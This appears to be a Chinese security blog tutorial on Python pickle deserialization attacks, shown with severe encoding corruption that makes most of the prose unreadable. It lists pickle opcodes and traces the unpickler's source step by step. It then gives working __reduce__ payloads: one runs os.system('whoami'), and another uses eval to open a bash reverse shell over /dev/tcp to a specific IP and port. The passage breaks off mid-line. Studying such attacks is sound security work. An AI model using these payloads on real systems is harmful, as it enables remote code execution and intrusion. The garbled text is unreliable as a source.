åºåˆ—ï¼špickleæ¨¡å—åœ¨åºåˆ—åŒ–Pythonå¯¹è±¡æ—¶ï¼Œä¼šç”Ÿæˆä¸€ç³»åˆ—æ“ä½œç ï¼ˆopcodeï¼‰æ¥è¡¨ç¤ºå¯¹è±¡çš„ç±»å‹å’Œå€¼ã€‚è¿™äº›æ“ä½œç å°†è¢«ä¿å­˜åˆ°æ–‡ä»¶æˆ–ç½‘ç»œæµä¸­ï¼Œä»¥ä¾¿åœ¨ååºåˆ—åŒ–æ—¶ä½¿ç”¨ã€‚ ååºåˆ—åŒ–æ“ä½œç ï¼šåœ¨ååºåˆ—åŒ–æ—¶ï¼Œpickleæ¨¡å—è¯»å–æ“ä½œç åºåˆ—ï¼Œå¹¶å°†å…¶è§£é‡Šä¸ºPythonå¯¹è±¡ã€‚å®ƒé€šè¿‡Pickle Virtual Machineæ¥æ‰§è¡Œæ“ä½œç åºåˆ—ã€‚Virtual Machineä¼šæŒ‰é¡ºåºè¯»å–æ“ä½œç ï¼Œå¹¶æ ¹æ®æ“ä½œç çš„ç±»å‹æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚ æ‰§è¡Œæ“ä½œç ï¼šPickle Virtual Machineæ”¯æŒå¤šç§æ“ä½œç ï¼ŒåŒ…æ‹¬å‹å…¥å¸¸é‡ã€è°ƒç”¨å‡½æ•°ã€è®¾ç½®å±æ€§ç­‰ã€‚æ‰§è¡Œæ“ä½œç çš„è¿‡ç¨‹ä¸­ï¼ŒVirtual Machineä¼šç»´æŠ¤ä¸€ä¸ªæ ˆæ¥å­˜å‚¨æ•°æ®ã€‚å½“æ‰§è¡Œæ“ä½œç æ—¶ï¼Œå®ƒä¼šå°†æ•°æ®ä»æ ˆä¸­å–å‡ºï¼Œå¹¶æ ¹æ®æ“ä½œç çš„ç±»å‹è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚æ‰§è¡Œå®Œæˆåï¼Œç»“æœå°†è¢«å‹å…¥æ ˆä¸­ã€‚ æ„é€ Pythonå¯¹è±¡ï¼šå½“æ“ä½œç åºåˆ—è¢«å®Œå…¨æ‰§è¡Œåï¼ŒPickle Virtual Machineä¼šå°†æ ˆé¡¶çš„æ•°æ®ä½œä¸ºç»“æœè¿”å›ã€‚è¿™ä¸ªç»“æœå°±æ˜¯ååºåˆ—åŒ–åçš„Pythonå¯¹è±¡ã€‚ å¸¸ç”¨çš„opcode æŒ‡ä»¤ æè¿° å…·ä½“å†™æ³• æ ˆä¸Šçš„å˜åŒ– c è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å— c[module]\\n[instance]\\n è·å¾—çš„å¯¹è±¡å…¥æ ˆ o å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ o è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ i ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ i[module]\\n[callable]\\n è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ N å®ä¾‹åŒ–ä¸€ä¸ªNone N è·å¾—çš„å¯¹è±¡å…¥æ ˆ S å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ Sâ€™xxxâ€™\\n è·å¾—çš„å¯¹è±¡å…¥æ ˆ V å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡ Vxxx\\n è·å¾—çš„å¯¹è±¡å…¥æ ˆ I å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡ Ixxx\\n è·å¾—çš„å¯¹è±¡å…¥æ ˆ F å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡ Fx.x\\n è·å¾—çš„å¯¹è±¡å…¥æ ˆ R é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•° R å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ . ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼ . æ—  ( å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®° ( MARKæ ‡è®°å…¥æ ˆ t å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ t MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ ) å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„ ) ç©ºå…ƒç»„å…¥æ ˆ l å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨ l MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ ] å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨ ] ç©ºåˆ—è¡¨å…¥æ ˆ d å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰ d MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ } å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸ } ç©ºå­—å…¸å…¥æ ˆ p å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n pn\\n æ—  g å°†memo_nçš„å¯¹è±¡å‹æ ˆ gn\\n å¯¹è±¡è¢«å‹æ ˆ 0 ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡ 0 æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ b ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½® b æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ s å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­ s ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–° u å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­ u MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–° a å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­ a æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–° e å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­ e MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–° æ‰€æœ‰opcode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485MARK = b'(' # push special markobject on stackSTOP = b'.' # every pickle ends with STOPPOP = b'0' # discard topmost stack itemPOP_MARK = b'1' # discard stack top through topmost markobjectDUP = b'2' # duplicate top stack itemFLOAT = b'F' # push float object; decimal string argumentINT = b'I' # push integer or bool; decimal string argumentBININT = b'J' # push four-byte signed intBININT1 = b'K' # push 1-byte unsigned intLONG = b'L' # push long; decimal string argumentBININT2 = b'M' # push 2-byte unsigned intNONE = b'N' # push NonePERSID = b'P' # push persistent object; id is taken from string argBINPERSID = b'Q' # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b'R' # apply callable to argtuple, both on stackSTRING = b'S' # push string; NL-terminated string argumentBINSTRING = b'T' # push string; counted binary string argumentSHORT_BINSTRING= b'U' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argumentBINUNICODE = b'X' # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b'a' # append stack top to list below itBUILD = b'b' # call __setstate__ or __dict__.update()GLOBAL = b'c' # push self.find_class(modname, name); 2 string argsDICT = b'd' # build a dict from stack itemsEMPTY_DICT = b'}' # push empty dictAPPENDS = b'e' # extend list on stack by topmost stack sliceGET = b'g' # push item from memo on stack; index is string argBINGET = b'h' # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b'i' # build &amp; push class instanceLONG_BINGET = b'j' # push item from memo on stack; index is 4-byte argLIST = b'l' # build list from topmost stack itemsEMPTY_LIST = b']' # push empty listOBJ = b'o' # build &amp; push class instancePUT = b'p' # store stack top in memo; index is string argBINPUT = b'q' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b'r' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b's' # add key+value pair to dictTUPLE = b't' # build tuple from topmost stack itemsEMPTY_TUPLE = b')' # push empty tupleSETITEMS = b'u' # modify dict by adding topmost key+value pairsBINFLOAT = b'G' # push float; arg is 8-byte float encodingTRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.pyFALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO = b'\\x80' # identify pickle protocolNEWOBJ = b'\\x81' # build object by applying cls.__new__ to argtupleEXT1 = b'\\x82' # push object from extension registry; 1-byte indexEXT2 = b'\\x83' # ditto, but 2-byte indexEXT4 = b'\\x84' # ditto, but 4-byte indexTUPLE1 = b'\\x85' # build 1-tuple from stack topTUPLE2 = b'\\x86' # build 2-tuple from two topmost stack itemsTUPLE3 = b'\\x87' # build 3-tuple from three topmost stack itemsNEWTRUE = b'\\x88' # push TrueNEWFALSE = b'\\x89' # push FalseLONG1 = b'\\x8a' # push long from &lt; 256 bytesLONG4 = b'\\x8b' # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES = b'B' # push bytes; counted binary string argumentSHORT_BINBYTES = b'C' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b'\\x8c' # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8 = b'\\x8d' # push very long stringBINBYTES8 = b'\\x8e' # push very long bytes stringEMPTY_SET = b'\\x8f' # push empty set on the stackADDITEMS = b'\\x90' # modify set by adding topmost stack itemsFROZENSET = b'\\x91' # build frozenset from topmost stack itemsNEWOBJ_EX = b'\\x92' # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL = b'\\x93' # same as GLOBAL but using names on the stacksMEMOIZE = b'\\x94' # store top of the stack in memoFRAME = b'\\x95' # indicate the beginning of a new frame# Protocol 5BYTEARRAY8 = b'\\x96' # push bytearrayNEXT_BUFFER = b'\\x97' # push next out-of-band bufferREADONLY_BUFFER = b'\\x98' # make top of stack readonly opcodeæºç åˆ†æ1234567891011import pickleclass test: def __init__(self): self.people = 'lituer'a = test()serialized = pickle.dumps(a, protocol=3) # æŒ‡å®šPVM åè®®ç‰ˆæœ¬print(serialized)unserialized = pickle.loads(serialized) # æ³¨æ„ï¼Œloads èƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«ååºåˆ—åŒ–çš„ç‰ˆæœ¬print(unserialized.people) 1'\\x80\\x03c__main__\\ntest\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00peopleq\\x03X\\x06\\x00\\x00\\x00lituerq\\x04sb.' ä¸‹é¢åˆ†æä¸€æ•´æ®µopcodeç çš„ä½œç”¨ \\x80\\x03 æºç  123456def load_proto(self): proto = self.read(1)[0] if not 0 &amp;lt;= proto &amp;lt;= HIGHEST_PROTOCOL: raise ValueError(&quot;unsupported pickle protocol: %d&quot; % proto) self.proto = proto dispatch[PROTO[0]] = load_proto ä»£ç é¦–å…ˆä»è¾“å…¥æµä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚å¹¶å°†å…¶å­˜å‚¨åœ¨ proto å˜é‡ä¸­ã€‚ç„¶åï¼Œå®ƒæ£€æŸ¥è¯¥å˜é‡çš„å€¼æ˜¯å¦åœ¨åˆæ³•çš„ pickle åè®®èŒƒå›´å†…ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™å¼•å‘ä¸€ä¸ª ValueError å¼‚å¸¸ï¼ŒæŒ‡ç¤ºä¸æ”¯æŒçš„åè®®ã€‚æœ€åï¼Œå®ƒå°† proto å˜é‡çš„å€¼å­˜å‚¨åœ¨å¯¹è±¡çš„ proto å±æ€§ä¸­ï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚å°±æ˜¯åˆ¤æ–­ç‰ˆæœ¬å·çš„ï¼› c è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ä¼šåŠ å…¥self.stack æºä»£ç ï¼š 123456789def load_global(self): #å¾€åè¯»åˆ°æ¢è¡Œç¬¦ä½œä¸ºæ¨¡å—å __main__ module = self.readline()[:-1].decode(&quot;utf-8&quot;) #å¾€åè¯»åˆ°æ¢è¡Œç¬¦ä½œä¸ºç±»å animal name = self.readline()[:-1].decode(&quot;utf-8&quot;) #è¿›å…¥find_class klass = self.find_class(module, name) self.append(klass)#è·å–æ¨¡å—åæ·»åŠ åˆ°å½“å‰æ ˆä¸­dispatch[GLOBAL[0]] = load_global find_class()å‡½æ•° 12345678910111213141516171819def find_class(self, module, name): # åœ¨ç³»ç»Ÿå®¡æ ¸æ—¥å¿—ä¸­è®°å½•â€œpickle.find_classâ€äº‹ä»¶ï¼ŒåŒ…æ‹¬æ¨¡å—åå’Œå¯¹è±¡å sys.audit('pickle.find_class', module, name) # å¦‚æœåè®®ç‰ˆæœ¬å°äº3ä¸”å¼€å¯äº†fix_importsæ ‡å¿—ï¼Œåˆ™è¿›è¡Œç‰¹æ®Šçš„åç§°å’Œæ¨¡å—æ˜ å°„å¤„ç† if self.proto &lt; 3 and self.fix_imports: # å¦‚æœ(module, name)åœ¨NAME_MAPPINGä¸­ï¼Œåˆ™ä½¿ç”¨æ˜ å°„çš„åç§°ä»£æ›¿åŸåç§° if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] # å¦‚æœmoduleåœ¨IMPORT_MAPPINGä¸­ï¼Œåˆ™ä½¿ç”¨æ˜ å°„çš„æ¨¡å—åä»£æ›¿åŸæ¨¡å—å elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] # åŠ¨æ€åŠ è½½æŒ‡å®šæ¨¡å— __import__(module, level=0) # å¦‚æœåè®®ç‰ˆæœ¬å¤§äºç­‰äº4ï¼Œåˆ™ä½¿ç”¨_getattributeæ–¹æ³•è·å–å¯¹è±¡ if self.proto &gt;= 4: return _getattribute(sys.modules[module], name)[0] # å¦åˆ™ï¼Œä½¿ç”¨getattræ–¹æ³•è·å–å¯¹è±¡ else: return getattr(sys.modules[module], name) ç„¶åself.append(klass)æ·»åŠ åˆ°å½“å‰æ ˆä¸­,æ‰€ä»¥å½“å‰æ ˆä¸­æœ‰ï¼š 1self=&amp;gt; stack:[ç±»] q å¯¹åº”æºç  12345678910111213def load_binput(self): # ä»è¾“å…¥æµä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ä½œä¸ºç´¢å¼•ï¼Œè¡¨ç¤ºå¾…ä¿å­˜å¯¹è±¡åœ¨memoå­—å…¸ä¸­çš„ä½ç½® i = self.read(1)[0] # å¦‚æœè¯»å–åˆ°çš„ç´¢å¼•å°äº0ï¼Œåˆ™å¼•å‘ValueErrorå¼‚å¸¸ if i &lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) # å°†å½“å‰å †æ ˆé¡¶éƒ¨çš„å¯¹è±¡ä¿å­˜åˆ°memoå­—å…¸ä¸­ï¼Œä½¿ç”¨è¯»å–åˆ°çš„ç´¢å¼•ä½œä¸ºé”®å€¼ self.memo[i] = self.stack[-1] # å°†memoå­—å…¸æ·»åŠ åˆ°å †æ ˆä¸­ self.append(self.memo)# å°†load_binputå‡½æ•°æ³¨å†Œåˆ°pickleåº“çš„åˆ†å‘è¡¨ä¸­ï¼Œä»¥ä¾¿åœ¨åºåˆ—åŒ–æ—¶è°ƒç”¨dispatch[BINPUT[0]] = load_binput æ‰€ä»¥è®°å¿†æ ˆä¸­å­˜åœ¨äº†testç±» 1memo=&amp;gt; stack:[ç±»] ) 123def load_empty_tuple(self): self.append(())#å‘å½“å‰æ ˆä¸­å¢åŠ ä¸€ä¸ªæ–°çš„å…ƒç»„ dispatch[EMPTY_TUPLE[0]] = load_empty_tuple æ“ä½œå®Œä¹‹åæ ˆåŒºå°±å˜æˆäº† 1self=&amp;gt; stack:[ç±»ï¼Œ()] \\x81 å¼¹å‡ºselfæ ˆä¸­çš„ä¸¤ä¸ªå…ƒç´  ç„¶åæŠŠå‚æ•°ä¼ å…¥__new__å¯¹ç±»è¿›è¡Œå®ä¾‹åŒ– 1234567def load_newobj(self): args = self.stack.pop() # ç©ºå…ƒç»„() cls = self.stack.pop() # obj = cls.__new__(cls, *args) #__new__æ–¹æ³•çš„ä½œç”¨æ˜¯ä¿®æ”¹ä¸å¯å˜ç±»(int,String)ç­‰åŸºæœ¬ç±»éƒ½æ˜¯ä¸å¯å˜ç±»ï¼Œæ­¤å¤„ä¸éœ€ä¿®æ”¹ï¼Œæ‰€ä»¥ä¼ å…¥å…ƒç»„ self.append(obj) #å°†å®ä¾‹åŒ–çš„testç»™selfè¿™ä¸ªselfæ ˆä¸­dispatch[NEWOBJ[0]] = load_newobj è¿™æ—¶çš„selfæ ˆåŒº 1self=&amp;gt; stack:[(å¯¹è±¡)] q æŠŠselfä¸­çš„å¯¹è±¡å‹å…¥memoæ ˆä¸­ 123456def load_binput(self): i = self.read(1)[0]#ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œèµ‹å€¼ç»™i if i &amp;lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) self.memo[i] = self.stack[-1]#å°†æ ˆä¸­çš„æ ˆå°¾(ä¸æ ˆé¡¶ç›¸å¯¹)å­˜å…¥è®°å¿†æ ˆä¸­memodispatch[BINPUT[0]] = load_binput å½“å‰çš„memoæ ˆæœ‰ 1memo=&amp;gt; stack:[(ç±») , (å¯¹è±¡)] } å‘æ ˆåŒºå‹å…¥ä¸€ä¸ªç©ºå­—å…¸ 123def load_empty_dictionary(self): self.append({}) dispatch[EMPTY_DICT[0]] = load_empty_dictionary å½“å‰selfæ ˆ 1self=&amp;gt; stack:[(å¯¹è±¡)ï¼Œ{}] q 123456def load_binput(self): i = self.read(1)[0] if i &amp;lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) self.memo[i] = self.stack[-1]#å°†æ ˆä¸­çš„æ ˆå°¾æ ˆé¡¶å­˜å…¥è®°å¿†æ ˆä¸­memo dispatch[BINPUT[0]] = load_binput å½“å‰memoæ ˆ 1memo=&amp;gt; stack:[(ç±») , (å¯¹è±¡),{}] X æºç  12345678def load_binunicode(self): len, = unpack('&lt;i&gt;6 if len &amp;gt; maxsize: #è¿™é‡Œçš„6ä¹Ÿå°±æ˜¯åé¢çš„x06ä¹Ÿå°±æ˜¯å±æ€§åå­—ç¬¦ä¸²çš„é•¿åº¦ raise UnpicklingError(&quot;BINUNICODE exceeds system's maximum size &quot; &quot;of %d bytes&quot; % maxsize) self.append(str(self.read(len), 'utf-8', 'surrogatepass')) #å†å¾€åè¯»lené•¿åº¦çš„å­—èŠ‚æ•° peopleï¼ˆå±æ€§åï¼‰ ç„¶åå­˜å…¥åˆ°æ ˆä¸­ä¸­dispatch[BINUNICODE[0]] = load_binunicode æ‰€ä»¥selfæ ˆä¸­å°±æ˜¯ 1self=&amp;gt; stack:[(å¯¹è±¡),{},&quot;people&quot;] q å’Œä¸Šé¢çš„æ€è·¯ä¸€æ ·ï¼Œä¸å¤šèµ˜è¿°äº† æ­¤æ—¶çš„memoæ ˆä¸­çš„å†…å®¹å¦‚ä¸‹ 1memo=&amp;gt; stack:[(ç±») , (å¯¹è±¡),{},&quot;people&quot;] X è¯»å–åé¢çš„\\x03è¯†åˆ«é•¿åº¦ä¸ºä¸‰çš„å­—ç¬¦ä¸² 12345678def load_binunicode(self): len, = unpack('&lt;i&gt; 3 if len &amp;gt; maxsize: #è¯»å–åé¢çš„\\x03è¯†åˆ«é•¿åº¦ä¸ºä¸‰çš„å­—ç¬¦ä¸² raise UnpicklingError(&quot;BINUNICODE exceeds system's maximum size &quot; &quot;of %d bytes&quot; % maxsize) self.append(str(self.read(len), 'utf-8', 'surrogatepass')) dog #å†å¾€åè¯»lené•¿åº¦çš„å­—èŠ‚æ•° lituerï¼ˆå±æ€§å€¼ï¼‰ ç„¶åå­˜å…¥åˆ°æ ˆä¸­ä¸­dispatch[BINUNICODE[0]] = load_binunicode æ­¤æ—¶selfæ ˆä¸­çš„å†…å®¹ 1self=&amp;gt; stack:[(å¯¹è±¡),{},&quot;people&quot;,&quot;lituer&quot;] q 123456def load_binput(self): i = self.read(1)[0]#ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—èŠ‚ \\x04 ï¼Œèµ‹å€¼ç»™i if i &amp;lt; 0: raise ValueError(&quot;negative BINPUT argument&quot;) self.memo[i] = self.stack[-1] dispatch[BINPUT[0]] = load_binput å½“å‰memoçš„æ ˆä¸­çš„å†…å®¹ 1memo=&amp;gt; stack:[(ç±») , (å¯¹è±¡),{},&quot;people&quot;,&quot;lituer&quot;] s å°†æ ˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸º valueï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸º keyï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸º keyï¼‰ä¸­ å¯¹åº”æºç  12345678910 def load_setitem(self): stack = self.stack value = stack.pop() #&quot;people&quot; key = stack.pop() #&quot;lituer&quot; #å¼¹å‡ºè¿™ä¸¤ä¸ªå¯¹è±¡ dict = stack[-1] #æ ˆé¡¶{} # dict[key] = value #{&quot;people&quot;:&quot;lituer&quot;} dispatch[SETITEM[0]] = load_setitemself=&amp;gt; stack:[(å¯¹è±¡),{&quot;people&quot;:&quot;lituer&quot;}] b ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ª å±æ€§å-å±æ€§å€¼ çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®ï¼Œè°ƒç”¨ setstate æˆ– dict.update() æºç  123456789101112131415161718192021222324252627 def load_build(self): stack = self.stack state = stack.pop() #{&quot;people&quot;:&quot;lituer&quot;} inst = stack[-1] #(å¯¹è±¡) setstate = getattr(inst, &quot;__setstate__&quot;, None) if setstate is not None: #æ£€æŸ¥æ˜¯å¦å­˜åœ¨ __setstate__ æ–¹æ³• ä¸€èˆ¬æ˜¯ä¸å­˜åœ¨çš„ ############################################### setstate(state) ###########ä¼šé€ æˆä»»æ„å‡½æ•°è°ƒç”¨ ############################################ return slotstate = None if isinstance(state, tuple) and len(state) == 2: state, slotstate = state if state: inst_dict = inst.__dict__ intern = sys.intern for k, v in state.items(): if type(k) is str: inst_dict[intern(k)] = v else: inst_dict[k] = v if slotstate: for k, v in slotstate.items(): setattr(inst, k, v) dispatch[BUILD[0]] = load_buildself=&amp;gt; stack:[(æ‹¥æœ‰æ•°æ®çš„å¯¹è±¡) æ‰€ä»¥æœ€åæ ˆé¡¶çš„å†…å®¹å°±æ˜¯ååºåˆ—åŒ–åçš„å†…å®¹ . ç»“æŸååºåˆ—åŒ– 1234def load_stop(self): value = self.stack.pop() raise _Stop(value)dispatch[STOP[0]] = load_stop è‡³æ­¤æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ç»“æŸï¼Œç›¸ä¿¡åˆ°æ­¤ä¸ºæ­¢PVMçš„å·¥ä½œåŸç†æœ‰äº†ä¸€ä¸ªæ˜ç¡®çš„äº†è§£ åˆ©ç”¨æ€è·¯å‘½ä»¤æ‰§è¡Œ__reduce__1234567891011121314151617import pickleimport osimport base64class zIxyd(object): def __reduce__(self): s = &quot;whoami&quot; return os.system, (s,)payload = zIxyd()serialze = pickle.dumps(payload)base64_data = base64.b64encode(serialze)print(base64_data)pickle.loads(serialze)#b'gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4='#king\\24603 æ³¨æ„ï¼šéƒ¨åˆ†Linuxç³»ç»Ÿä¸‹å’ŒWindowsä¸‹çš„opcodeå­—èŠ‚æµå¹¶ä¸å…¼å®¹ï¼Œæ¯”å¦‚Windowsä¸‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ä¸ºnt.system()ï¼Œåœ¨éƒ¨åˆ†Linuxä¸‹åˆ™ä¸ºposix.system(); ç”¨evalå‡½æ•° 123456789101112import pickleimport base64class zIxyd(object): def __reduce__(self): return (eval, (&quot;__import__('os').system('/bin/bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\&quot;')&quot;,))payload = zIxyd()pickle_a = pickle.dumps(payload)encoded_data = 